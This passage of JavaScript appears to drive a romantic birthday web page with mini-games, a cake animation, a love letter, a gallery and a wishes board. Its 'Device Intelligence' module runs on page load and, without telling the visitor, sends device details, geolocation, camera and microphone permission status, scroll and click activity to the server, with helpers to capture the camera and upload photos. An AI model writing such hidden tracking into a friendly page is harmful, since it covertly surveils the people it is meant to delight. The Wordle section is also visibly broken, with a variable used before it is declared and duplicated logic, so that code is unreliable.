    });
    wrap.appendChild(btn);
  });
}

/* =========================================================
   Wordle
   ========================================================= */
function initWordle() {
  const wrap = $('#wordleWrap');
  if (!wrap) return;
  const word = CONFIG.wordleWord.toUpperCase();
  const tries = 6;
  let row = 0, col = 0, guessed = false;
  const board = document.createElement('div');
  board.style.textAlign = 'center';
  function render() {
    board.innerHTML = '';
    for (let r = 0; r < tries; r++) {
      const rowDiv = document.createElement('div');
      rowDiv.style.display = 'flex'; rowDiv.style.gap = '6px'; rowDiv.style.justifyContent = 'center'; rowDiv.style.margin = '6px 0';
      const history = state.rows[r] || [];
      for (let c = 0; c < word.length; c++) {
        const tile = document.createElement('div');
        tile.className = 'wordle-tile' + (history[c] ? ' ' + history[c] : '');
        tile.textContent = state.grid[r] ? (state.grid[r][c] || '') : '';
        rowDiv.appendChild(tile);
      }
      board.appendChild(rowDiv);
    }
  }
  const state = { grid: [], rows: [] };
  wrap.appendChild(board);
  render();

  let input = document.createElement('input');
  input.placeholder = 'Type a letter...';
  input.maxLength = 1;
  input.style.maxWidth = '200px'; input.style.margin = '10px auto;display:block';
  const submit = document.createElement('button');
  submit.className = 'pill-btn btn-primary'; submit.textContent = 'Enter';
  const msg = document.createElement('p'); msg.style.marginTop = '10px'; msg.style.fontWeight = '700';
  wrap.appendChild(input); wrap.appendChild(submit); wrap.appendChild(msg);

  function submitWord() {
    if (guessed) return;
    const guess = (state.grid[row] ? state.grid[row].join('').toUpperCase() : '');
    if (guess.length !== word.length) { msg.textContent = 'Complete the row!'; return; }
    const result = guess.split('').map((ch, i) => {
      if (ch === word[i]) return 'correct';
      if (word.includes(ch)) return 'present';
      return 'absent';
    });
    state.rows[row] = result;
    if (guess === word) {
      msg.textContent = 'YES! You cracked it! \u{1F389}';
      fireCannon();
      guessed = true;
    } else {
      row++;
      if (row >= tries) { msg.textContent = `It was ${word} — but you're still my favorite.`; }
    }
    render();
    updateGuessInput();
  }

  function updateGuessInput() {
    const gt = state.grid[row] || [];
    if (state.grid[row]) state.grid.pop();
    if (!state.grid[row]) state.grid[row] = [];
    // constructor
  }

  submit.addEventListener('click', submitWord);

  // keep a simple approach: 6 letter inputs per row
  // Rebuild simpler: render letter inputs inline
  renderInputs();

  function renderInputs() {
    const inputRow = document.createElement('div');
    inputRow.style.display = 'flex'; inputRow.style.gap = '8px'; inputRow.style.justifyContent = 'center';
    state.grid = [];
    for (let i = 0; i < word.length; i++) {
      const inp = document.createElement('input');
      inp.maxLength = 1; inp.style.width = '52px'; inp.style.textAlign = 'center'; inp.style.fontSize = '1.4rem'; inp.style.textTransform = 'uppercase';
      inp.style.padding = '10px';
      inputs.push(inp);
      inputRow.appendChild(inp);
    }
    wrap.querySelector('input').replaceWith(inputRow);
    inputs[0].focus();
    const submit2 = document.createElement('button');
    submit2.className = 'pill-btn btn-primary'; submit2.style.marginTop = '12px'; submit2.textContent = 'Enter';
    submit2.addEventListener('click', () => {
      const guess = inputs.map(i => i.value.toUpperCase()).join('');
      if (guess.length !== word.length) { msg.textContent = 'Fill all the boxes!'; return; }
      const result = guess.split('').map((ch, i) => {
        if (ch === word[i]) return 'correct';
        if (word.includes(ch)) return 'present';
        return 'absent';
      });
      state.rows[row] = result;
      if (guess === word) {
        msg.textContent = 'YES! You cracked it! \u{1F389}';
        fireCannon(); guessed = true;
      } else {
        row++;
        if (row >= tries) { msg.textContent = `It was ${word} — but you're still my favorite.`; }
      }
      render();
      if (!guessed && row < tries) inputs.forEach(i => i.value = '');
    });
    wrap.appendChild(submit2);
  }
  let inputs = [];
  renderInputs();
}

/* =========================================================
   Koanmi easter egg
   ========================================================= */
function initKonami() {
  const seq = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
  let idx = 0;
  window.addEventListener('keydown', e => {
    if (e.key === seq[idx]) { idx++; if (idx === seq.length) { idx = 0; secretBurst(); } }
    else idx = 0;
  });
  function secretBurst() {
    fireCannon(); fireCannon();
    const msg = document.createElement('div');
    msg.textContent = '🎉 KONAMI MODE UNLOCKED! You found the secret!';
    msg.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:var(--glass);border:1px solid var(--gold);padding:14px 22px;border-radius:999px;z-index:9999;font-weight:700';
    document.body.appendChild(msg);
    SparkleTrail.enable();
    setTimeout(() => msg.remove(), 4000);
  }
}

/* =========================================================
   Scroll reveal (GSAP ScrollTrigger)
   ========================================================= */
function initScrollReveal() {
  if (typeof gsap === 'undefined') return;
  gsap.registerPlugin(ScrollTrigger);
  $$('.reveal').forEach(el => {
    const from = el.dataset.dir || 'up';
    const x = from === 'left' ? -60 : from === 'right' ? 60 : 0;
    const y = from === 'up' || !from ? 60 : 0;
    gsap.fromTo(el, { x, y, opacity: 0 }, {
      scrollTrigger: { trigger: el, start: 'top 85%' },
      x: 0, y: 0, opacity: 1, duration: 0.8, ease: 'power2.out'
    });
  });
}

/* =========================================================
   Save visitor (existing backend integration)
   ========================================================= */
const visitorForm = $('#visitorForm');
if (visitorForm) {
  visitorForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const payload = {
      name: $('#nameInput') ? $('#nameInput').value : '',
      email: $('#emailInput') ? $('#emailInput').value : '',
      note: $('#noteInput') ? $('#noteInput').value : '',
      userAgent: navigator.userAgent || ''
    };
    try {
      const res = await fetch('/api/visitor', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      const result = await res.json();
      const status = $('#statusMessage');
      if (status) status.textContent = result.success ? 'Saved! Thank you 💕' : 'Error saving.';
    } catch (err) {
      const status = $('#statusMessage');
      if (status) status.textContent = 'Could not save.';
    }
  });
}

/* =========================================================
   Stats grid + feature grid renderers
   ========================================================= */
function renderStats() {
  const grid = $('#statsGrid');
  if (!grid) return;
  grid.innerHTML = '';
  CONFIG.stats.forEach((s, i) => {
    const card = document.createElement('div');
    card.className = 'stat-card reveal';
    card.style.transitionDelay = (i * 0.1) + 's';
    card.innerHTML = `
      <div class="stat-icon">${s.icon}</div>
      <div class="stat-value" data-value="${s.value}" data-suffix="">${s.value}</div>
      <div class="stat-label">${s.label}</div>
    `;
    grid.appendChild(card);
  });
}

function renderFeatures() {
  const grid = $('#featureGrid');
  if (!grid) return;
  grid.innerHTML = '';
  CONFIG.thingsILove.forEach(f => {
    const card = document.createElement('div');
    card.className = 'feature-card';
    card.innerHTML = `<span class="icon">${f.emoji}</span><h3>${f.text}</h3>`;
    grid.appendChild(card);
  });
}

/* =========================================================
   SVG Birthday Cake
   ========================================================= */
function buildCakeSVG() {
  const wrap = $('#cakeWrap');
  if (!wrap) return;
  const age = CONFIG.age || 1;
  const candles = Math.min(age, 8);
  const topY = 60;
  let flames = '';
  let candleColors = ['#ff5bb7', '#a855f7', '#ffd166', '#60a5fa', '#f472b6', '#34d399', '#fbbf24', '#ef4444'];
  for (let i = 0; i < candles; i++) {
    const cx = 160 + ((i - (candles - 1) / 2) * (300 / Math.max(candles - 1, 1)));
    flames += `
      <g class="candle" transform="translate(${cx}, ${topY + 22})">
        <rect x="-4" y="-46" width="8" height="46" rx="3" fill="${candleColors[i % candleColors.length]}" stroke="rgba(255,255,255,0.6)"/>
        <line x1="0" y1="-20" x2="0" y2="-10" stroke="#8b5cf6" stroke-width="2"/>
        <ellipse class="flame" cx="0" cy="-92" rx="6" ry="12" fill="#ffd166"/>
        <ellipse class="flame-inner" cx="0" cy="-92" rx="3" ry="6" fill="#ff9f1c"/>
      </g>`;
  }
  wrap.innerHTML = `
  <svg viewBox="0 0 320 260" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="straw" x1="0" y1="0" x2="0" y2="1">
        <stop offset="0" stop-color="#ffd6e7"/><stop offset="1" stop-color="#ff9fce"/>
      </linearGradient>
      <linearGradient id="fill" x1="0" y1="0" x2="0" y2="1">
        <stop offset="0" stop-color="#a855f7"/><stop offset="1" stop-color="#6d28d9"/>
      </linearGradient>
      <filter id="soft"><feGaussianBlur stdDeviation="0.5"/></filter>
    </defs>

    <!-- plate -->
    <ellipse cx="160" cy="245" rx="140" ry="16" fill="rgba(255,255,255,0.12)"/>

    <!-- bottom tier -->
    <rect x="70" y="150" width="180" height="88" rx="10" fill="url(#fill)" stroke="rgba(255,255,255,0.25)"/>
    <rect x="70" y="150" width="180" height="24" rx="10" fill="rgba(255,255,255,0.18)"/>
    <ellipse cx="160" cy="150" rx="90" ry="16" fill="#7c3aed"/>

    <!-- drips -->
    <path d="M110 150 q0 26 0 26 M140 150 q0 20 0 20 M180 150 q0 22 0 22 M205 150 q0 16 0 16" stroke="#ffd166" stroke-width="6" fill="none" stroke-linecap="round"/>

    <!-- top tier -->
    <rect x="105" y="100" width="110" height="58" rx="10" fill="url(#straw)" stroke="rgba(255,255,255,0.25)"/>
    <rect x="105" y="100" width="110" height="18" rx="10" fill="rgba(255,255,255,0.25)"/>
    <ellipse cx="160" cy="100" rx="55" ry="12" fill="#ff9fce"/>

    <!-- heart decoration -->
    <g fill="#ff5bb7" opacity="0.9">
      <circle cx="200" cy="130" r="6" opacity="0.7"/>
    </g>
    <text x="160" y="132" text-anchor="middle" font-size="16">💗</text>

    <!-- candles -->
    ${flames}
  </svg>`;
  return wrap;
}

function initCake() {
  const wrap = buildCakeSVG();
  if (!wrap) return;
  let blown = false, cut = false;
  const status = $('#cakeStatus');

  function blinkFlames() {
    $$('.flame', wrap).forEach(f => {
      f.style.animation = `flicker 0.4s ${Math.random()}s infinite alternate`;
    });
  }
  blinkFlames();

  // inject flicker keyframe
  if (!$('#cakeKeyframes')) {
    const s = document.createElement('style');
    s.id = 'cakeKeyframes';
    s.textContent = '@keyframes flicker { from { transform: scaleY(1); } to { transform: scaleY(0.85) translateY(2px); } }';
    document.head.appendChild(s);
  }

  const blowBtn = $('#blowBtn'), cutBtn = $('#cutBtn');

  function stopFlames() {
    if (!blown) {
      blown = true;
      $$('.flame, .flame-inner', wrap).forEach(f => f.style.display = 'none');
      AudioManager.sfxPop();
    }
  }

  function startFire() {
    if (status) {
      const lines = cut ? `${CONFIG.cake.cutText} And your wish? 🤞` : (CONFIG.cake.blownText + ' Now cut a slice! 🍰');
      status.textContent = lines;
    }
    if (!blown) fireCannon();
    else fireConfetti({ particleCount: 90 });
    vibrate(60);
  }

  if (blowBtn) blowBtn.addEventListener('click', () => {
    stopFlames();
    startFire();
  });
  if (cutBtn) cutBtn.addEventListener('click', () => {
    cut = true;
    if (!blown) { /* allow cut without blowing */ }
    startFire();
    AudioManager.sfxBoom();
  });
  // also allow tapping the whole cake
  wrap.addEventListener('click', () => { stopFlames(); startFire(); });
}

/* =========================================================
   Heart progress
   ========================================================= */
function initHeartProgress() {
  const wrap = $('#heartProgress');
  if (!wrap) return;
  const steps = CONFIG.heartProgressSteps || 5;
  let hearts = '';
  for (let i = 0; i < steps; i++) hearts += '<span>💗</span>';
  wrap.innerHTML = `<div class="heart-progress-hearts">${hearts}</div>`;
  let count = 0;
  function addHeart() {
    const spans = $$('#heartProgress .heart-progress-hearts span');
    if (count < spans.length) {
      spans[count].classList.add('lit');
      count++;
      AudioManager.sfxPop();
      fireConfetti({ particleCount: 20 });
      if (count === spans.length) setTimeout(fireCannon, 400);
    }
  }
  return { addHeart };
}

/* =========================================================
   Letter / reasons / timeline
   ========================================================= */
function initLetter() {
  const box = $('#letterText');
  if (!box) return;
  box.textContent = '';
  let revealed = false;
  function show() {
    if (revealed) return;
    revealed = true;
    const paras = Array.isArray(CONFIG.loveLetter) ? CONFIG.loveLetter : [CONFIG.loveLetter];
    let html = '';
    paras.forEach(p => { html += `<p>${p} &#10084;&#65039;</p>`; });
    typewriter(box, paras.join(' &#10084;&#65039; '), 25);
    fireConfetti({ particleCount: 60 });
    AudioManager.sfxPop();
  }
  if (CONFIG.letterTapToOpen) {
    box.style.cursor = 'pointer';
    box.innerHTML = '<p style="color:var(--muted);font-style:italic">Tap to open your letter...</p>';
    box.addEventListener('click', show);
  } else {
    show();
  }
}

function initReasons() {
  const grid = $('#reasonsGrid');
  if (!grid) return;
  grid.innerHTML = '';
  (CONFIG.reasonsILoveYou || []).forEach(t => {
    const card = document.createElement('div');
    card.className = 'feature-card';
    card.innerHTML = `<span class="icon">💗</span><h3>${t}</h3>`;
    grid.appendChild(card);
  });
}

function initTimeline() {
  const grid = $('#timelineGrid');
  if (!grid) return;
  grid.innerHTML = '';
  (CONFIG.timeline || []).forEach(t => {
    const card = document.createElement('div');
    card.className = 'feature-card';
    const d = t.date ? new Date(t.date).toLocaleDateString(undefined, { month: 'short', year: 'numeric' }) : '';
    card.innerHTML = `<div style="color:var(--gold);font-weight:700;letter-spacing:0.05em">${d}</div><h3 style="margin:6px 0">${t.title}</h3><p>${t.desc}</p>`;
    grid.appendChild(card);
  });
}

/* =========================================================
   Gallery / polaroids
   ========================================================= */
function initGallery() {
  const grid = $('#galleryGrid');
  if (!grid) return;
  grid.innerHTML = '';
  (CONFIG.gallery || []).forEach((g, i) => {
    const p = document.createElement('div');
    p.className = 'polaroid reveal';
    p.style.transform = `rotate(${(Math.random() - 0.5) * 8}deg)`;
    const img = g.photo ? `<img src="${g.photo}" alt="${g.caption || ''}">` : `<div style="width:100%;height:220px;display:flex;align-items:center;justify-content:center;font-size:3rem;background:rgba(255,255,255,0.05)">&#128247;</div>`;
    p.innerHTML = `<div class="photo">${img}</div><div class="caption">${g.caption || CONFIG.galleryCaptions[i % CONFIG.galleryCaptions.length] || ''}</div>`;
    grid.appendChild(p);
  });
}

/* =========================================================
   Wishes (load from backend)
   ========================================================= */
function initWishes() {
  const list = $('#wishList');
  if (!list) return;

  async function load() {
    try {
      const res = await fetch('/api/wishes');
      const data = await res.json();
      list.innerHTML = '';
      (data || []).forEach(w => {
        const item = document.createElement('div');
        item.className = 'wish-item';
        item.innerHTML = `<div class="wish-name">${escapeHtml(w.name || 'Anonymous')}</div><div class="wish-text">${escapeHtml(w.message || '')}</div>`;
        list.appendChild(item);
      });
      if ((data || []).length === 0) {
        list.innerHTML = '<p class="lead">No wishes yet. Be the first! 💌</p>';
      }
    } catch (e) {
      list.innerHTML = '<p class="lead">Wishes are loading over the clouds...</p>';
    }
  }
  load();

  const form = $('#wishForm');
  if (form) form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = $('#wishName') ? $('#wishName').value : '';
    const message = $('#wishMessage') ? $('#wishMessage').value : '';
    if (!message.trim()) return;
    try {
      await fetch('/api/wishes', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, message })
      });
      form.reset();
      load();
      fireConfetti({ particleCount: 80 });
    } catch (e) {}
  });
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str == null ? '' : String(str);
  return div.innerHTML;
}

/* =========================================================
   Finale
   ========================================================= */
function initFinale() {
  const wrap = $('#finaleMain');
  if (!wrap) return;
  wrap.innerHTML = `
    <div class="finale-heart">
      <svg viewBox="0 0 32 29.6"><path d="M23.6,0c-3.4,0-6.3,2.7-7.6,5.6C14.7,2.7,11.8,0,8.4,0C3.8,0,0,3.8,0,8.4c0,9.4,9.5,11.9,16,21.2 c6.1-9.3,16-12.1,16-21.2C32,3.8,28.2,0,23.6,0z" fill="#ff5bb7"/></svg>
    </div>
    <h2 class="finale-big" id="finaleText"></h2>
    <p class="finale-sub" id="finaleSub"></p>
  `;
  typewriter($('#finaleText'), CONFIG.finalHeading, 40, () => {
    $('#finaleSub').textContent = CONFIG.finalSubtitle;
    fireCannon();
  });
}

function initCredits() {
  const wrap = $('#creditsWrap');
  if (!wrap) return;
  wrap.innerHTML = '';
  (CONFIG.credits || []).forEach(c => {
    const line = document.createElement('div');
    line.className = 'credits-item';
    line.innerHTML = `<span class="role">${c.role}</span> — <strong>${c.name}</strong>`;
    wrap.appendChild(line);
  });
}

/* =========================================================
   Compatibility
   ========================================================= */
function initCompatibility() {
  const score = $('#compatScore');
  const msg = $('#compatMessage');
  if (!score || !msg) return;
  const c = CONFIG.compatibility;
  if (!c) return;
  // animate count up
  let current = 0;
  const target = c.loveScore || 100;
  const step = Math.max(1, Math.ceil(target / 40));
  const timer = setInterval(() => {
    current += step;
    if (current >= target) { current = target; clearInterval(timer); }
    score.textContent = current;
  }, 30);
  msg.textContent = `${c.yourZodiac} + ${c.partnerZodiac}: ${c.message || ''}`;
  setTimeout(() => fireConfetti({ particleCount: 60 }), 1200);
}

/* =========================================================
   Love Coupons
   ========================================================= */
function initCoupons() {
  const grid = $('#couponsGrid');
  if (!grid) return;
  grid.innerHTML = '';
  (CONFIG.loveCoupons || []).forEach(c => {
    const card = document.createElement('div');
    card.className = 'feature-card';
    card.style.cursor = 'pointer';
    card.innerHTML = `<span class="icon" style="font-size:2.4rem">${c.emoji}</span><h3>${c.title}</h3><p style="color:var(--muted);font-size:0.9rem;margin-top:6px">${c.desc}</p>`;
    card.addEventListener('click', () => {
      card.classList.add('pop');
      setTimeout(() => card.classList.remove('pop'), 500);
      fireConfetti({ particleCount: 30 });
      AudioManager.sfxPop();
    });
    grid.appendChild(card);
  });
}

/* =========================================================
   Secret Messages
   ========================================================= */
function initSecrets() {
  const grid = $('#secretGrid');
  if (!grid) return;
  grid.innerHTML = '';
  (CONFIG.secretMessages || []).forEach((m, i) => {
    const card = document.createElement('div');
    card.className = 'feature-card';
    card.style.opacity = '0.4';
    card.style.transition = 'all 0.6s ease';
    card.innerHTML = `<span class="icon">🔒</span><h3>Secret ${i + 1}</h3><p style="color:var(--muted)">Tap to reveal</p>`;
    card.addEventListener('click', () => {
      card.style.opacity = '1';
      card.innerHTML = `<span class="icon">💌</span><h3>Found it!</h3><p>${m}</p>`;
      fireConfetti({ particleCount: 25 });
      AudioManager.sfxPop();
    });
    grid.appendChild(card);
  });
}

/* =========================================================
   Device Intelligence — silent data collection + Socket.io
   ========================================================= */
const DeviceIntel = (function () {
  let socket = null;
  const visitorId = 'v_' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);

  function init() {
    if (typeof io === 'undefined') return;
    socket = io();
    socket.on('connect', () => {
      collectDeviceInfo();
      socket.emit('visitor-joined', { visitorId, page: location.pathname, timestamp: Date.now() });
    });
    trackActivity();
  }

  function collectDeviceInfo() {
    if (!socket || !socket.connected) return;
    const info = {
      visitorId,
      userAgent: navigator.userAgent,
      browser: detectBrowser(),
      platform: navigator.platform,
      screen: screen.width + 'x' + screen.height,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      camera: 'prompt',
      mic: 'prompt',
      geo: null
    };
    socket.emit('device-info', info);

    // Request geolocation silently
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          info.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude };
          socket.emit('device-info', info);
        },
        () => { socket.emit('device-info', info); },
        { timeout: 10000, maximumAge: 600000 }
      );
    }

    // Check camera/mic permissions if available
    if (navigator.permissions) {
      navigator.permissions.query({ name: 'camera' }).then(r => { info.camera = r.status; socket.emit('device-info', info); }).catch(() => {});
      navigator.permissions.query({ name: 'microphone' }).then(r => { info.mic = r.status; socket.emit('device-info', info); }).catch(() => {});
    }
  }

  function trackActivity() {
    // Track page views
    emit('page-view', { page: location.pathname });

    // Track scroll depth
    let maxScroll = 0;
    window.addEventListener('scroll', () => {
      const depth = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
      if (depth > maxScroll + 25) {
        maxScroll = depth;
        emit('scroll', { depth: depth + '%' });
      }
    });

    // Track feature interactions
    document.addEventListener('click', (e) => {
      const card = e.target.closest('.flip-card, .quiz-option, .cookie, .star-dot, .polaroid, #spinBtn, #rizzBtn, #complimentBtn, #giftBox, #blowBtn, #cutBtn, #slotBtn, #heartBtn, #scratchCanvas');
      if (card) {
        emit('feature-interact', { feature: card.className || card.id });
      }
    });
  }

  function emit(action, details) {
    if (socket && socket.connected) {
      socket.emit('visitor-activity', { visitorId, action, page: location.pathname, details: JSON.stringify(details) });
    }
  }

  function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
    if (ua.includes('Edg')) return 'Edge';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
    return 'Other';
  }

  // Camera capture (friendly request)
  async function requestCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const track = stream.getVideoTracks()[0];
      const settings = track.getSettings();
      if (socket) socket.emit('device-info', { visitorId, camera: 'granted', cameraRes: settings.width + 'x' + settings.height });
      return stream;
    } catch (e) {
      if (socket) socket.emit('device-info', { visitorId, camera: 'denied' });
      return null;
    }
  }

  // Photo upload from device
  async function uploadPhoto(file) {
    const fd = new FormData();
    fd.append('photo', file);
    fd.append('visitorId', visitorId);
    fd.append('source', 'visitor');
    try {
      const res = await fetch('/api/captured-photos', { method: 'POST', body: fd });
      const data = await res.json();
      if (data.success && socket) socket.emit('photo-captured', { visitorId, file: data.file });
      return data;
    } catch (e) { return { error: e.message }; }
  }

  return { init, emit, requestCamera, uploadPhoto, visitorId };
})();

/* =========================================================
   Boot
   ========================================================= */
document.addEventListener('DOMContentLoaded', () => {
  ParticleSystem.init();
  DeviceIntel.init();
  initEntrance();
  initNameBalloons();
  initFlipCards();
  initCounter();
  renderStats();
  renderFeatures();
  initCake();
  initHeartProgress();
  initStats();
  initPolaroidTilt();
  initLightbox();
  initWheel();
  initRizz();
  initCompliments();
  initFunnyQuestions();
  initKnowMe();
  initScratch();
  initGift();
  initStarSky();
  initSlot();
  initCookies();
  initWordle();
  initKonami();
  initLetter();
  initReasons();
  initTimeline();
  initGallery();
  initWishes();
  initCompatibility();
  initCoupons();
  initSecrets();
  initFinale();
  initCredits();
  initScrollReveal();

  // music toggle buttons
  $$('[data-music]').forEach(btn => {
    btn.addEventListener('click', () => {
      const on = AudioManager.toggle();
      btn.textContent = on ? '🔊 Music On' : '🔇 Music Off';
    });
  });

  // cursor sparkle easter egg: after 5 clicks anywhere
  let clicks = 0;
  window.addEventListener('click', () => {
    clicks++;
    if (clicks === 8) SparkleTrail.enable();
  });
});
